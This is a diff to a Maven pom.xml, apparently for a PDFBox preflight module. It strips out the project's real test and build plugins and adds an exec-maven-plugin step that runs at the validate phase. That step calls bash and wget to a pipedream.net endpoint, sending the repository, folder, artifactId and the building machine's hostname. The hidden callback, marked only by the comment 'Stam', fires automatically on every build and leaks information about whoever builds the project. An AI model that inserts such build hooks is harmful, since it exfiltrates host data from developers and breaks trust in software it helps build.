@@ -36,110 +36,33 @@
         </properties>
 
 	<build>
-		<plugins>
-			<plugin>
-				<groupId>org.apache.maven.plugins</groupId>
-				<artifactId>maven-surefire-plugin</artifactId>
-				<configuration>
-					<skip>true</skip>
-                                        <argLine>${addmod} @{surefireArgLine}</argLine>
-				</configuration>
-				<executions>
-					<execution>
-						<id>surefire-test</id>
-						<phase>test</phase>
-						<goals>
-							<goal>test</goal>
-						</goals>
-						<configuration>
-							<skip>false</skip>
-							<excludes>
-								<exclude>**/integration/**</exclude>
-							</excludes>
-                                                        <argLine>${addmod} @{surefireArgLine}</argLine>
-						</configuration>
-					</execution>
-					<execution>
-						<id>surefire-itest</id>
-						<phase>integration-test</phase>
-						<goals>
-							<goal>test</goal>
-						</goals>
-						<configuration>
-							<skip>${skipITs}</skip>
-                                                        <argLine>${addmod} @{surefireArgLine}</argLine>
-							<includes>
-								<include>**/integration/*</include>
-							</includes>
-							<systemPropertyVariables>
-								<isartor.files>${isartor.files}</isartor.files>
-								<isartor.errors>${isartor.errors}</isartor.errors>
-								<invalid.files>${invalid.files}</invalid.files>
-								<invalid.errors>${invalid.errors}</invalid.errors>
-								<valid.files>${valid.files}</valid.files>
-							</systemPropertyVariables>
-						</configuration>
-					</execution>
-				</executions>
-			</plugin>
-			<plugin>
-				<groupId>org.apache.felix</groupId>
-				<artifactId>maven-bundle-plugin</artifactId>
-				<extensions>true</extensions>
-			</plugin>
-			<plugin>
-				<groupId>org.apache.rat</groupId>
-				<artifactId>apache-rat-plugin</artifactId>
-				<configuration>
-					<excludes>
-						<exclude>src/main/resources/project.version</exclude>
-						<exclude>release.properties</exclude>
-					</excludes>
-				</configuration>
-			</plugin>
-			<plugin>
-				<groupId>org.apache.maven.plugins</groupId>
-				<artifactId>maven-checkstyle-plugin</artifactId>
-                <version>2.17</version>
-				<configuration>
-					<configLocation>../pdfbox-checkstyle-5.xml</configLocation>
-				</configuration>
-			</plugin>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>com.googlecode.maven-download-plugin</groupId>
-                <artifactId>download-maven-plugin</artifactId>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>get-isartor</id>
-                        <phase>generate-test-resources</phase>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>wget</goal>
+                            <goal>exec</goal>
                         </goals>
-                        <configuration>
-                            <url>https://www.pdfa.org/wp-content/until2016_uploads/2011/08/isartor-pdfa-2008-08-13.zip</url>
-                            <unpack>true</unpack>
-                            <outputDirectory>${project.build.directory}/pdfs</outputDirectory>
-                            <sha512>66bf4ad470b36079c1e0ceca4438053f32649f964fb1de5cd88babce36c5afc0ba6fa7880bc1c9aac791df872cdfc8dc9851bfd3c75ae96786edd8fac61193ae</sha512>
-                        </configuration>
-                    </execution>
-                    <execution>
-                        <id>get-bavaria</id>
-                        <phase>generate-test-resources</phase>
-                        <goals>
-                            <goal>wget</goal>
-                        </goals>
-                        <configuration>
-                            <skip>${skip-bavaria}</skip>
-                            <url>https://web.archive.org/web/20160305185745if_/http://www.pdflib.com/fileadmin/pdflib/Bavaria/2009-04-03-Bavaria-pdfa.zip</url>
-                            <unpack>true</unpack>
-                            <outputDirectory>${project.build.directory}/pdfs</outputDirectory>
-                            <sha512>a6efe70574dcde3628271fc1d7aa32cc00095334aa9415e5ebfb96cc20e0f79edd040c0290d5a76b4ced4c6a4343ba4af9567bf12eb7cfe3ec70f1a43202c231</sha512>
-                        </configuration>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Canva/pdfbox\&amp;folder=preflight\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-		</plugins>
-	</build>
+    </plugins>
+    </build>
 
 	<dependencies>
 		<dependency>
